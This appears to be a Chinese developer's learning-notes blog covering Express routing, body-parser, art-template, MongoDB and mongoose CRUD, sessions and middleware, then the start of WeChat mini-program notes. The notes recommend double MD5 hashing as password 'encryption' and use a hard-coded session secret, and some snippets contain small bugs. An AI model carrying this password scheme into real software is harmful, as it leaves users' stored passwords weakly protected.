属性中就记录了 art-template 的入口模块 然后加载使用这个第三方包 实际上最终加载的还是文件 if 本级无法查找到 就会往上一级 找node_modules… 直到根目录 if 还无 就报错 正常项目就一个node….在根目录 5. Express 原生 http 在某方面表现不足以应对开发需求 所以需要使用框架 加快开发效率 在node中 有很多web开发框架 以学习Express(封装http)为主 作者 : TJ node作者:ryan dahl 官方网站 5.1 起步 5.1.1 安装 npm install express --save 5.1.2 使用： 1.导包 2.创建服务器应用程序 处理路径问题 和中文乱码 app.get(‘/’, function (req, res) { res.send(‘hello’) }) 公开指定目录 app.use(‘/public/’, express.static(‘./public/’)) 直接获取查询字符串参数 req.query 响应代码 res.send() res.redirect(‘/’) 和 res.send() 会直接结束请求 1234567891011121314151617181920212223// 2. 引包const express = require(&quot;express&quot;);// 3. 创建服务器应用程序 == http.createServerlet app = express();// 公开指定目录 public 就可以直接通过 /public/xxx 访问目录中的所有资源app.use(&#x27;/public/&#x27;, express.static(&#x27;./public/&#x27;))// 服务器收到get请求时 执行回调函数// 直接处理路径问题 和中文乱码app.get(&#x27;/&#x27;, function (req, res) &#123; res.send(&#x27;hello&#x27;) // 也可以原来的 res.end()&#125;)app.get(&#x27;/other&#x27;, function (req, res) &#123; console.log(req.query); // 直接获取 查询字符串参数 res.send(&#x27;其他&#x27;)&#125;)// ==server.listenapp.listen(3000, function () &#123; console.log(&#x27;running...&#x27;);&#125;) 5.1.3 基本路由 路由器：请求方法 请求路径 请求处理函数 app.get(‘/’,function(){}) app.post(‘/’,function(){}) 5.1.4 静态服务/路由 官网 -&gt; getting started -&gt; static file 当以 /public/ 开头时 去 ./public/ 目录找对应的资源 app.use(‘/public/’ , express.static(‘./public/’)) =&gt; /public/xxx 当省略第一个参数时 则通过省略 /public 的目录 访问 简化路径操作 app.use(express.static(‘./public/’)) =&gt; /xxx 当第一个参数 为 /a/ 时 ，相当于 在目录中 ./public/ 被 ./a/ 替换(别名) app.use(‘/a/’ , express.static(‘./public/’)) =&gt; /a/xxx 5.2 express 配置使用 art-template 模板引擎 生成 package.js ==&gt; npm init –yes 安装 express ==&gt; npm i -S express 安装在express 使用的art-template ==&gt; npm i -S art-template npm i -S express-art-template 配置： … app.engine(‘html’, require(‘express-art-template’)) ==&gt; ‘art’ 可以 ‘html’ … 第一个参数：当渲染以 .art 文件时 使用art-template模板 express-art-template 专门用来在 express 中把 art-template 整合到 express 中 express-art-template 依赖 art-template 使用： app.get(‘/’,function(req,res){ res.render(‘index.art’),{ title:‘hello’ } }) Express 为 Response 对象提供了 render 方法 默认不能用 配置模板引擎才能用 res.render(‘html模板名’ , {模板数据}) ==&gt; if 上engine 为 art 那模板名就要.art 第一个参数不写路径(省略 views 而已) 默认会去 views 目录找 模板文件 (把所有视图文件都放到 views ) if 希望修改 默认 的 views 视图渲染目录 ==&gt; app.set(‘views’,目录路径) 5.4 express 获取表单 get 请求体数据 express 内置了api 直接通过 req.juery 获取 5.5 express 获取表单 post 请求体数据 提交表单 get —&gt; post /puton —&gt; publish : 用同一个请求路径 可以多次处理请求 get/post 在express 中没有内置获取表单post请求体的api ==&gt; 使用 第三方包 body-parse (express官网 minddleware )中间件/插件 安装 : npm i -S body-parse 配置 : 12345678910111213const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;) //---引包var app = express();// 在req请求多一个body属性 通过req.body 获取表单post请求体数据app.use(bodyParser.json()) //---配置 body-parserapp.use(bodyParser.urlencoded(&#123; extended: true &#125;))app.post(&#x27;/publish&#x27;, function (req, res) &#123; comments.unshift(req.body); res.redirect(&#x27;/&#x27;)&#125;) 5.6 crub 案例的知识点 注意点 ：表单提交的时候 要有name 才能提交到 查询字符串 把对象存在文件里 然后读取使用 读取的是字符串-&gt;对象 读取文件错误 用状态码500 123456fs.readfile(&#x27;./db.json&#x27;,function(err,data)&#123; if(err)&#123; return res.status(500).send(&#x27;server error&#x27;); &#125; student:JSON.parse(data).students&#125;) 路由设计 请求方法、请求路径、get参数、post参数、备注 将 基本路由与app主要的东西分离开来 把app导出 运行 app.js 文件 1234567891011121314151617181920//app.jsconst express = require(&quot;express&quot;);const router = require(&#x27;./router&#x27;); //!!!let app = express();app.use(&#x27;/public/&#x27;, express.static(&#x27;./public/&#x27;))router(app); //!!!app.listen(3000, function () &#123; console.log(&#x27;running....&#x27;);&#125;)module.export = app;//router.jsmodule.exports = function(app)&#123; app.get(&#x27;/&#x27;,...)&#125; express 专门包装路由的方式 app.js 职责：创建服务 ​ 做一些服务相关配置:模板引擎、body-parser解析表单 post 请求体、提供静态资源服务 ​ 挂载路由 ​ 监听端口启动服务 router.js 职责：处理路由 根据不同的请求方法+路径 具体处理函数 创建路由容器 router 把路由都挂载到 router 路由容器中 导出 router 把路由挂载到app服务器上 12345678910111213141516171819202122//app.jsconst express = require(&quot;express&quot;);const router = require(&#x27;./router&#x27;); //!!!let app = express();app.use(&#x27;/public/&#x27;, express.static(&#x27;./public/&#x27;))app.use(router); //挂载!!!app.listen(3000, function () &#123; console.log(&#x27;running....&#x27;);&#125;)module.export = app;//router.jsconst express = require(&quot;express&quot;);const router = express.Router();router.get(&#x27;/&#x27;,...);router.get(&#x27;/&#x27;,...);module.exports = router 6. MongoDB 教程 6.1 关系型数据库 和 非关系型数据库 关系 === 表 (表与表之间存在关系) 需要通过 sql 语言操作 操作之前要设计表结构 数据包支持约束 非关系 非常灵活 有的即使 key-value 键值对 MongoDB 是长得最像 关系型数据库的 非关系型数据库 数据库 -&gt; 数据库 数据表 -&gt; 集合/数组 表记录 -&gt; 文档对象 不需要设计表结构 可以任意存数据 没有结构性 比较灵活 6.2 安装 下载 安装 配环境变量 : 命令行检查 mongod --version 6.3 启动、关闭、连接、退出连接数据库 启动：mongod ​ mongod 默认使用执行 mongod 命令所处盘符根目录下的 /data/db 作为自己的数据存储目录 ​ 第一次执行时应该提前创建一个 /data/db 修改默认的数据存储目录 : mongod --dbpath=数据存储目录路径 关闭 : ctrl + c / 关闭终端 连接 ： mongo (默认连接本机的 MongoDB 服务) 断开 ： exit (退出连接) 6.4 基本命令 show dbs : 查看显示所有数据库 db : 查看当前操作的数据库 use 数据库名称 : 切换到指定的数据库(if 本无 —&gt; 创建后切换) db.集合名称.insertOne(&#123;...&#125;) : 插入数据 —&gt; 一个对象 db.集合名称.find() : 查看这个集合的所有文档对象 6.5 在node中 操作 mongoDB 数据 通过官方 mongodb 包操作 比较原生 一般不用 教程 通过第三方包 mogoose 操作MongoDB 数据库 基于官方(上面)做的一个封装 官网 下载包 npm install mongodb --global 下载包 npm install mongoose --save 写一个官网的例子 12345678910111213const mongoose = require(&#x27;mongoose&#x27;);// 连接MongoDB数据库mongoose.connect(&#x27;mongodb://localhost:27017/test&#x27;, &#123; useNewUrlParser: true, useUnifiedTopology: true &#125;);// 创建一个模型 设计数据库 Mongodb 是动态的 只需要在代码中设计数据库// mongoose 这个包可以让你的设计编写过程变得非常简单const Cat = mongoose.model(&#x27;Cat&#x27;, &#123; name: String &#125;);// 实例化一个catconst kitty = new Cat(&#123; name: &#x27;Zildjian&#x27; &#125;);// 持久化保存 kitty实例kitty.save().then(() =&gt; console.log(&#x27;meow&#x27;)); 在 终端 运行 node demo.js 可以在数据库查看 6.5.1 mongoose 官网：https://mongoosejs.com/ 官方指南：https://mongoosejs.com/docs/guide.html 官方api：https://mongoosejs.com/docs/api.html 6.5.2 MongoDB 数据库的基本概念 数据库 集合 文档 -&gt; 文档结构没有限制 很灵活 在需要插入数据时 只需要指定往哪个数据库的哪个集合操作就可以了 其他都有 mongodb 自动完成建库建表 1234567&#123; qq:&#123; //数据库 users:[ // 集合 -&gt;数组 &#123;name:&#x27;li&#x27;, age:15&#125;, //文档 -&gt; 表记录 对象 ] &#125;&#125; 6.6 官方指南 6.6.1 设计Scheme 发布 Model 123456789101112131415161718192021222324252627282930313233343536const mongoose = require(&#x27;mongoose&#x27;);const Schema = mongoose.Schema; //创建设计结构// 1.连接数据库// 指定连接的数据库不需要存在，在插入第一条数据之后就会自动被创建处理mongoose.connect(&#x27;mongodb://localhost/itcast&#x27;)// 2.设计集合/文档结构// 字段名称就是表结构中的属性名称// 约束的目的是为了保证数据的完整性 避免脏数据const userSchame = new Schema(&#123; username: &#123; type: String, require: true &#125;, password: &#123; type: String, require: true &#125;, email: &#123; type: String &#125;&#125;)// 3.讲文档结构发布为模型// mongoose.model 方法就是用来将一个架构发布为 model// 第一个参数：传入一个大写名称单数字符串 User -&gt; 数据库名称// mongoose 会自动将大写名词的字符串 生成 小写复数 users -&gt; 集合名称// 第二个参数：架构 Schema// 返回值：模型对象/构造函数const User = mongoose.model(&#x27;User&#x27;, userSchame)// 4. 当有了模型构造函数后 就可以使用构造函数对 users集合 中数据形象操作 6.6.2 增加数据 1234567891011121314151617181920212223const admin = new User(&#123; username: &#x27;admin&#x27;, password: &#x27;123456&#x27;, email: &#x27;admin@admin.com&#x27;&#125;)admin.save(function (err, ret) &#123; if (err) &#123; console.log(&#x27;err&#x27;); &#125; else &#123; console.log(&#x27;success&#x27;); console.log(ret); &#125;&#125;)//console结果&#123; _id: 612124d035f7324bb036ea01, username: &#x27;admin&#x27;, password: &#x27;123456&#x27;, email: &#x27;admin@admin.com&#x27;, __v: 0&#125; 6.6.3 查询数据 查到的数据都会放在 数组里[] 查不到就是 null 查询所有 12345678910111213141516171819User.find(function (err, ret) &#123; if (err) &#123; console.log(&#x27;err&#x27;); &#125; else &#123; console.log(&#x27;success&#x27;); console.log(ret); &#125;&#125;)//ret[ &#123; _id: 612124d035f7324bb036ea01, username: &#x27;admin&#x27;, password: &#x27;123456&#x27;, email: &#x27;admin@admin.com&#x27;, __v: 0 &#125;] 条件查找 12345678910111213141516171819User.find(&#123; username: &#x27;zs&#x27; &#125;, function (err, ret) &#123; if (err) &#123; console.log(&#x27;err&#x27;); &#125; else &#123; console.log(&#x27;success&#x27;); console.log(ret); &#125;&#125;)//ret[ &#123; _id: 612126bb120a184418be6b6d, username: &#x27;zs&#x27;, password: &#x27;123456&#x27;, email: &#x27;admin@admin.com&#x27;, __v: 0 &#125;] 查询单个 if无条件 查第一个 &amp; 条件 123456789User.findOne(&#123; username: &#x27;zs&#x27;, password:&#x27;123456&#x27; &#125;, function (err, ret) &#123; // &amp; 条件 if (err) &#123; console.log(&#x27;err&#x27;); &#125; else &#123; console.log(&#x27;success&#x27;); console.log(ret); &#125;&#125;) || 条件查询 $or:[] 1234567891011User.findOne( &#123; $or: [&#123;username: &#x27;zs&#x27;&#125;, &#123;password:&#x27;123456&#x27;&#125;] &#125;, function (err, ret) &#123; // &amp; 条件 if (err) &#123; console.log(&#x27;err&#x27;); &#125; else &#123; console.log(&#x27;success&#x27;); console.log(ret); &#125;&#125;) 6.6.4 删除数据 12345678910111213141516171819User.remove(&#123; username: &#x27;zs&#x27; &#125;, function (err, ret) &#123; if (err) &#123; console.log(&#x27;err&#x27;); &#125; else &#123; console.log(&#x27;success&#x27;); console.log(ret); &#125;&#125;)//ret&#123; n: 1, ok: 1, deletedCount: 1 &#125;// 删除 根据条件删除所有User.findOneAndRemove(&#123; conditions &#125;, [options], [callback])// 删除 根据id删除一个User.findByIdAndRemove(&#123; conditions &#125;, [options], [callback]) 6.6.5 更新数据 第一个参数：id 之前控制 ret 出现的 id 第二个参数：修改的值 12345678910// 第一个参数：id 之前控制 ret 出现的 id// 第二个参数：修改的值User.findByIdAndUpdate(&#x27;612124d035f7324bb036ea01&#x27;, &#123; password: &#x27;22222&#x27; &#125;, function (err, ret) &#123; if (err) &#123; console.log(&#x27;err&#x27;); &#125; else &#123; console.log(&#x27;success&#x27;); console.log(ret); &#125;&#125;) 6.7 mongoose 的 api 全部支持 promise 6.7.1 查询数据 12345678910111213141516// promise 查询所有User.find().then(data =&gt; console.log(data))// 做一个用户注册案例 查找用户是否存在User.findOne(&#123; name: &#x27;lsysxn&#x27; &#125;).then(user =&gt; &#123; if (user) &#123; // 用户存在 console.log(&#x27;always exist&#x27;); &#125; else &#123; return new User(&#123; username: &#x27;lsysxn&#x27;, password: &#x27;123456&#x27;, email: &#x27;lsy&#x27; &#125;).save() &#125;&#125;).then(ret =&gt; &#123; &#125;) 7. 论坛项目 7.1 path 模块 path 核心模块 — 操作路径 path.basename(path [, ext]) : 获取path中的文件名 无对应后缀名 [, ext] 就返回加上后缀的文件名 path.basename(‘D:/a/b/index.js’) —&gt; index.js path.basename(‘D:/a/b/index.js’ , ‘.js’) —&gt; index path.dirname(path) : 返回path中的目录 path.dirname(‘D:/a/b/index.js’) —&gt; D:/a/b path.extname(path) : 返回 path 中的后缀名 path.extname(‘D:/a/b/index.js’) —&gt; .js path.isAbsolute(path) : 判断是否绝对路径 path.parse(path) : 将 path 解析成对象 path.parse(‘d:/a/b/index.js’) —&gt; { root: ‘d:/’ , dir: ‘d:/a/b’ , base: ‘index.js’ , ext: ‘.js’ , name: ‘html’} path.join([…paths]) : 拼接 paths , 两个path之间加 /, 支持任意个参数 path.join(‘c:/a’ , ‘b’) —&gt; c:\\\\a\\\\b 2 \\ 转义成一个\\ windowns 表示路径是用\\ 7.2 node中的其他成员 在每个模块中，除了 require exports 等模块相关的api之外 还有两个特殊成员： __dirname : 动态获取当前文件模块所属目录的绝对路径 __filename : 动态获取当前文件的绝对路径(包含 文件名) __dirname 和 __filename 不受node 命令所属路径影响 在文件操作核心模块 fs 中 读取文件 里文件路径 if ./a.html -&gt; 读取的是 相对于执行node命令所处的终端路径 eg：a.html 在 c:/in/out/side/a.html 在这个路径下还有一个index.js -&gt; c:/in/out/side/index.js 有一个读文件的操作 fs.readfile(‘./a.html’) 在终端这样运行 c:/in/out/side&gt; node index.js 时是不会报错的 此时读的a.html地址 c:/in/out/side/html 但这样运行 c:/in/out&gt; node side/index.js 时 读的a.html的地址就是 c:/in/out/index/js 所以在文件操作中，使用相对路径不可靠 ==&gt;&gt; 所以要使用动态的绝对路径 为了避免在使用的过程中出现路径拼接操作 使用 path.join() 所以推荐在文件模块操作中使用的相对路径统一转换为 动态的绝对路径 —&gt; fs.readFile(path.join(__dirname , ‘./a.txt’) , ‘utf8’ , function(err,data){ … }) ​ app.use(‘/public/’, express.static(‘./public/’)); —&gt; app.use(‘/public/’, express.static(path.join(__dirname , ‘./public/’))); —&gt; app.set(‘views’ , path.join(__dirname , ‘./views/’)) //默认就是 ./views 目录 —&gt; (模块中的路径标识不受node命令所处的路径影响) 7.3 art-template 中的 include extend block 语法 在node 中还有很多第三方模板引擎可以使用 ejs jade(pug) nunjucks &lt;%%&gt; &#123;&#123; &#125;&#125; 子模版 模板继承 &#123;&#123; include '文件路径' &#125;&#125; 将 文件路径的 文件导入该 html &#123;&#123; extend '文件路径' &#125;&#125; 继承 文件路径 中的模板 &#123;&#123; block 'name' &#125;&#125; &#123;&#123; /block&#125;&#125; 在模板中 留坑；在继承模板的html中填坑 也可以用 if else 选择要显示的dom &#123;&#123; if 条件 &#125;&#125; &#123;&#123; else &#125;&#125; &#123;&#123; /if &#125;&#125; 7.4 ajax 接受数据为 json 类型 封装ajax eg: 注册页面 post请求 123456789101112131415$.ajax(&#123; url:&#x27;/register&#x27;, type:&#x27;post&#x27;, data:formData, dataType:&#x27;json&#x27;, success:function(data)&#123; if(err_code === 0)&#123; log(&quot;成功&quot;) &#125;else if(err_code === 1)&#123; log(&quot;邮箱或者密码已存在&quot;) &#125;else if(err_code === 500)&#123; log(&quot;错误&quot;) &#125; &#125;&#125;) 数据响应时 也要用json格式 给每一个状态设置一个状态码 好用于上面success 进行处理 123456789101112131415161718...if(err)&#123; return res.status(500).json(&#123; err_code:500, message:&#x27;服务器错误&#x27; &#125;) &#125;if(data)&#123; return res.status(200).json(&#123; err_code:1, message:&#x27;邮箱或者密码已存在&#x27; &#125;)&#125;res.status(200).json(&#123; err_code:0, message:&#x27;ok&#x27;&#125;)... 7.5 密码加密 buleimp-md5 下载 ：npm i buleimp-md5 引包：const md5 = require('buleimp-md5') 使用 给密码 进行md5 重复加密 ：body.password = md5(md5(body.password)) 在准备创建用户前进行密码加密 下一步 new User(body).save() 加密后 if 要 登录 验证账号密码 要 1234User.findOne(&#123; email:body.email, password:md5(md5(body.password))&#125;,function()&#123;&#125;) 7.6 表单提交行为 表单默认提交行为：同步 ==&gt; 同步表单提交，浏览器会锁死(转圈)等待服务器响应结果 表单同步提交后，无论服务器端响应什么，都会直接将响应结果覆盖掉当前页面 ===&gt; 服务器重定向 7.6.1 服务器重定向对异步请求无效 所以上面的代码中在 这里成功的时候要 重定向 123456789101112131415161718192021222324$.ajax(&#123; url:&#x27;/register&#x27;, type:&#x27;post&#x27;, data:formData, dataType:&#x27;json&#x27;, success:function(data)&#123; if(err_code === 0)&#123; window.location.href = &#x27;/&#x27; //!!!!!! //log(&quot;成功&quot;) &#125;else if(err_code === 1)&#123; log(&quot;邮箱或者密码已存在&quot;) &#125;else if(err_code === 500)&#123; log(&quot;错误&quot;) &#125; &#125;&#125;)//在服务器这样是无效的res.status(200).json(&#123; err_code:0, message:&#x27;ok&#x27;&#125;)res.redirect(&#x27;/&#x27;) //无效 7.7 第三方中间件 express-session cookie 用来保存一些不太敏感的数据 不能用来保存登陆状态 session 比较安全 登陆状态 会有一个凭证 这个凭证是服务器给的 不容易伪造 在Express中 默认不支持 Session 和 Cookie 7.7.1 express-session 安装：npm i express-session 引用：const session = require('express-session') 配置：(一定要在 app.use(router)之前) 12345678// 会为 req 请求对象添加一个成员 req.sessionapp.use(session(&#123; secret:&#x27;keyboard&#x27;, //配合字符串 会在原有加密基础之上 加上这个字符拼起来 去加密 //== body.password = md5(md5(body.password) + &#x27;keyboard&#x27;) resave:false, saveUninitialized:true&#125;)) 使用：添加session数据 —&gt; req.session.foo = ‘bar’ ​ 获取session数据 —&gt; req.session.foo 默认 session 数据是内存存储的 服务器一旦重启 就会丢失 真正的生产环境会把 session 进行持久化 存储 7.7.2 浏览器插件editthiscookie 可以看cookie 和 ssession 的字段值 8. 中间件 在Express中 当请求进来，会从第一个中间件进行匹配 : if 匹配 —&gt; 请求进入中间件 ​ if 调用了next —&gt; 进入下一个匹配的中间件 ​ if 没调用 —&gt; 直接结束 ​ if 不匹配 —&gt; 一直往后走到匹配/结束为止 8.1 应用程序级别中间件 万能匹配(不关心任何请求路径和请求方法)： 1234app.use(function(req,res,next)&#123; log(...) next()&#125;) 以某路径 /xxx/ 开头 1234app.use(&#x27;/a&#x27;,function(req,res,next)&#123; log(...) next()&#125;) 8.2 路由级别中间件 get 123app.get(&#x27;/&#x27;,function(req,res,next)&#123; res.send(...)&#125;) post 123app.post(&#x27;/&#x27;,function(req,res,next)&#123; res.send(...)&#125;) … 8.3 错误处理中间件 1234app.use(function(err,req,res,next)&#123; console.error(...) res.status(500).send(...)&#125;) 8.3.1 配置处理一个 404 的中间件 在app.use(router) 挂载路由后 1234//在app.use(router) 挂载路由后app.use(function(req,res)&#123; res.render(&#x27;404.html&#x27;)&#125;) 8.3.2 配置一个处理全局错误处理中间件 在处理404页面后 1234567//在处理404页面后app.use(function(err,req,res,next)&#123; res.status(500).json(&#123; err_code:500, message:err.message &#125;)&#125;) 在其他的请求处理中应该再加一个参数 ，以及在有错误时要这样处理 next(err) 这样就会往后查找 带有四个参数的应用程序级别中间件中 12345678app.get(&#x27;/&#x27;,function(req,res,next)&#123; fs.readFile(&#x27;./a.txt&#x27;,function(err,data)&#123; if(err)&#123; next(err) &#125; ... &#125;)&#125;)","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://shylees.github.io/tags/nodejs/"},{"name":"http","slug":"http","permalink":"https://shylees.github.io/tags/http/"}]},{"title":"微信小程序","slug":"微信小程序","date":"2021-08-02T16:00:00.000Z","updated":"2021-08-05T16:00:00.000Z","comments":false,"path":"learningNotes/微信小程序","link":"learningNotes/微信小程序","permalink":"https://shylees.github.io/learningNotes/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F","excerpt":"","text":"1.软件介绍 1.1 下载 官网 注册 –&gt; 登录 -&gt; 注册appID -&gt; 下载微信开发者工具 -&gt; 安装 -&gt; 创建项目 介绍开发者工具的工具栏 1.2 配置文件介绍 1.2.1 app.json 全局配置 page : 用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径（含文件名） 信息。文件名不需要写文件后缀，框架会自动去寻找对应位置的 .json, .js, .wxml, .wxss 四个文件进行处理。 未指定 entryPagePath 时，数组的第一项代表小程序的初始页面（首页）。 小程序中新增/减少页面，都需要对 pages 数组进行修改。 window : 用于设置小程序的状态栏、导航条、标题、窗口背景色。 tabBar : 通过 tabBar 配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。 12345678910111213&#123; &quot;page&quot;:[ &quot;pages/index/index&quot;, &quot;pages/log/log&quot; ], &quot;window&quot;: &#123; &quot;navigationBarBackgroundColor&quot;: &quot;#ffffff&quot;, &quot;navigationBarTextStyle&quot;: &quot;black&quot;, &quot;navigationBarTitleText&quot;: &quot;微信接口功能演示&quot;, &quot;backgroundColor&quot;: &quot;#eeeeee&quot;, //下拉加载的位置 &quot;backgroundTextStyle&quot;: &quot;light&quot; //下拉加载的logo &#125;&#125; 1.2.2 index.json 页面配置 每一个小程序页面也可以使用 .json 文件来对本页面的窗口表现进行配置。页面中配置项在当前页面会覆盖 app.json 的 window 中相同的配置项。 123456789&#123; &quot;usingComponents&quot;: &#123;&#125;, //app.json 的 window 配置一样 &quot;navigationBarBackgroundColor&quot;: &quot;#ffffff&quot;, &quot;navigationBarTextStyle&quot;: &quot;black&quot;, &quot;navigationBarTitleText&quot;: &quot;微信接口功能演示&quot;, &quot;backgroundColor&quot;: &quot;#eeeeee&quot;, //下拉加载的位置 &quot;backgroundTextStyle&quot;: &quot;light&quot; //下拉加载的logo&#125; 可以手动关闭下拉刷新窗口 if 没用调用 也不会报错 index.js wx.stopPullDownRefresh(); 1.2.3 sitemap.json 配置 用于配置小程序及其页面是否允许被微信索引，文件内容为一个 JSON 对象，如果没有 sitemap.json ，则默认为所有页面都允许被索引； 2.模板语法 2.0 wxml 标签 vscode使用“微信小程序开发”插件 &lt;text&gt; == &lt;span&gt; &lt;view&gt; == &lt;div&gt; &lt;checkbox&gt; 复选框 2.1 数据绑定 123456789//demo01.jsPage(&#123; //页面的初始数据 data:&#123; msg:&#x27;hello mina&#x27;, isChecked:false &#125;&#125;) 12345678910&lt;!-- demo01.wxml --&gt;&lt;!-- 1.在文本中使用 --&gt;&lt;view&gt; &#123;&#123; msg &#125;&#125; &lt;/view&gt;&lt;!-- 2.在属性中使用 --&gt;&lt;view data-msg=&quot;&#123;&#123; msg &#125;&#125;&quot;&gt;自定义属性&lt;/view&gt;&lt;!-- 3.使用bool充当属性时 “ 和 &#123; 之间不要留空格 否则会导致识别失败 --&gt;&lt;checkbox checked=&quot;&#123;&#123;isCheck&#125;&#125;&quot;&gt;&lt;/checkbox&gt; 2.2 运算 运算 =&gt; 表达式 可以在 &#123;&#123; &#125;&#125; 中加入表达式 表达式 =&gt; 简单 运算 数字运算 拼接 逻辑运算 ​ 数字加减 字符串拼接 三元表达式 语句 =&gt; 复杂代码段 ​ if else switch do while for 123&lt;view&gt;&#123;&#123; 1+1 &#125;&#125;&lt;/view&gt; 2&lt;view&gt;&#123;&#123; &#x27;1&#x27;+&#x27;1&#x27; &#125;&#125;&lt;/view&gt; 11&lt;view&gt;&#123;&#123; 10%2===1 ? &#x27;奇数&#x27; : &#x27;偶数&#x27; &#125;&#125;&lt;/view&gt; 偶数 2.3 列表渲染 2.3.1 列表循环 wx:for=“” wx:for-item=“循环项name” wx:for-index=“循环项索引” wx:key=“唯一的值” -&gt; 为了提高列表性能 wx:key=“*this” -&gt; 表示你的数组是一个普通数组[] *this表示循环项 出现循环嵌套 以下绑定名称 不能重名 wx:for-item=“item” wx:for-index=“index” 默认情况下（一层循环）不用写 wx:for-item=“item” wx:for-index=“index” 2.3.2 对象循环 wx:for=“&#123;&#123;` 数组或者对象 `&#125;&#125;” wx:for-item=“对象的值” wx:for-index=“对象的键” 最好把 item index 的名称 修改下 item,index =&gt; value,key wx:key=“对象的任何一个属性” 123456789101112131415161718//demo01.jsPage(&#123; data: &#123; ... person: &#123; id: 123, name: &#x27;富婆&#x27;, height: &#x27;166&#x27;, &#125;, list: [ &#123; id: 0, name: &#x27;zero&#x27; &#125;, &#123; id: 1, name: &#x27;one&#x27; &#125;, &#123; id: 2, name: &#x27;two&#x27; &#125; ] &#125;,&#125;) 123456789101112131415 ----列表循环 wx:for------- &lt;view wx:for=&quot;&#123;&#123;list&#125;&#125;&quot; wx:for-item=&quot;item&quot; wx:for-index=&quot;index&quot; wx:key=&quot;id&quot;&gt; 索引:&#123;&#123;index&#125;&#125; ---- 值:&#123;&#123;item.name&#125;&#125;&lt;/view&gt; ----对象循环 wx:for-------&lt;view wx:for=&quot;&#123;&#123;person&#125;&#125;&quot; wx:for-item=&quot;value&quot; wx:for-index=&quot;key&quot; wx:key=&quot;id&quot;&gt; 属性:&#123;&#123;key&#125;&#125; ---- 值:&#123;&#123;value&#125;&#125;&lt;/view&gt; 2.3.3 block 标签 相当于一个占位符 写代码的时候 会有 页面运行后 这个标签直接不存在 123456789&lt;block wx:for=&quot;&#123;&#123;person&#125;&#125;&quot; wx:for-item=&quot;value&quot; wx:for-index=&quot;key&quot; wx:key=&quot;id&quot;&gt; 属性:&#123;&#123;key&#125;&#125; ---- 值:&#123;&#123;value&#125;&#125;&lt;/view&gt;==&gt;属性:id ---- 值:123 属性:name ---- 值:富婆 属性:height ---- 值:166 2.4 条件渲染 wx:if=“&#123;&#123;`true/false`&#125;&#125;” 使用添加删除元素 三选一 wx:if=“&#123;&#123;&#125;&#125;`” wx:elif=“`&#123;&#123;&#125;&#125;” wx:else hidden 使用display:none 在标签直接加入 hidden=“&#123;&#123;`true`&#125;&#125;” if 不是频繁切换显示 使用 wx:if 使用添加删除元素 if 频繁切换 使用hidden 使用display:none 所以使用hidden 不要用 display属性 123456789101112 &lt;view&gt; &lt;view&gt;条件渲染&lt;/view&gt; &lt;view wx:if=&quot;&#123;&#123;true&#125;&#125;&quot;&gt;if -&gt; true&lt;/view&gt; &lt;view wx:if=&quot;&#123;&#123;false&#125;&#125;&quot;&gt;if&lt;/view&gt; &lt;view wx:elif=&quot;&#123;&#123;true&#125;&#125;&quot;&gt;elif&lt;/view&gt; &lt;view wx:else&gt;else&lt;/view&gt; &lt;view hidden&gt;hidden1&lt;/view&gt; &lt;view hidden=&quot;&#123;&#123;true&#125;&#125;&quot;&gt;hidden -&gt; true&lt;/view&gt; &lt;view hidden=&quot;&#123;&#123;false&#125;&#125;&quot;&gt;hidden -&gt; false&lt;/view&gt;&lt;/view&gt; 3.事件绑定 3.1 input双向绑定 给input标签绑定input事件 绑定关键子 bindinput 通过事件源e 获取输入框的值 e.detail.value 使用 this.setData({ num:e.detail.value }) 绑定数据的值 3.2 button 点击事件 点击事件 绑定关键字 bindtap 不能在事件中 (1) 传参 要使用data-自定义属性传 使用事件源e 中获取dataset中的值 获取参数 123456&lt;input type=&quot;text&quot; bindinput=&quot;handleInput&quot; /&gt;&lt;button bindtap=&quot;handletap&quot; data-num=&quot;&#123;&#123;1&#125;&#125;&quot; &gt;+&lt;/button&gt;&lt;button bindtap=&quot;handletap&quot; data-num=&quot;&#123;&#123;-1&#125;&#125;&quot; &gt;-&lt;/button&gt;&lt;view&gt; &#123;&#123;num&#125;&#125;&lt;/view&gt; 1234567891011121314151617Page(&#123; data: &#123; num: 0 &#125;, //输入框input事件的执行逻辑 handleInput(e) &#123; this.setData(&#123; num: e.detail.value &#125;) &#125;, //加减按钮的事件 handletap(e) &#123; this.setData(&#123; num: this.data.num + e.currentTarget.dataset.num &#125;) &#125;,&#125;) 4. wxss样式 4.1 尺寸单位 rpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。 if 在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。 if 存在这样一个需求 设计稿 page 宽 ， 存在一个元素 100px 宽 要求页面适配 page px = 750rpx =&gt; 1px = 750rpx / page px =&gt; 100px = 750rpx * 100 / page 在wxss里写的时候 可以 使用calc 可以使用 + - * / ，% px em rem 可以混合使用各种单位 用 + - 时 其前后必有空格，* / 可无 但建议保留 数字与单位之间不留空格 4.2 样式导入 使用@import语句可以导入外联样式表，@import后跟需要导入的外联样式表的相对路径，用;表示语句结束。 1@import &quot;..wxss&quot; 4.3 选择器 除了不支持 * 全局选择 ，其他都与 css 一样 4.4 使用less 下载插件 easy less 在vs code 的设置中加入如下配置 123&quot;less.compile&quot;:&#123; &quot;outExt&quot;:&quot;.wxss&quot;&#125; 在编写样式的地方，建立.less文件 正常编辑即可 5. 常见组件 常用的布局组件 view，text，rich-text，button，image，navigator，icon，swiper，radio，checkbox，等 5.1 view 官方属性 属性 类型 默认值 必填 说明 最低版本 hover-class string none 否 指定按下去的样式类。当 hover-class=&quot;none&quot; 时，没有点击态效果 1.0.0 hover-stop-propagation boolean false 否 指定是否阻止本节点的祖先节点出现点击态 1.5.0 hover-start-time number 50 否 按住后多久出现点击态，单位毫秒 1.0.0 hover-stay-time number 400 否 手指松开后点击态保留时间，单位毫秒 1.0.0 5.2 text 文本标签 只能嵌套text 只有这个标签 可以长按文字复制 selectable 可以对空格 回车 进行编码 decode (if没有的话 像&amp;nbsp;这种符号会原样显示) decode可以解析的有&amp;nbsp; &amp;gt; &amp;amp; &amp;apos; &amp;ensp; &amp;emsp; 5.3 image 因为后期打包上线 不能超过2兆 ​ 所以会把很多 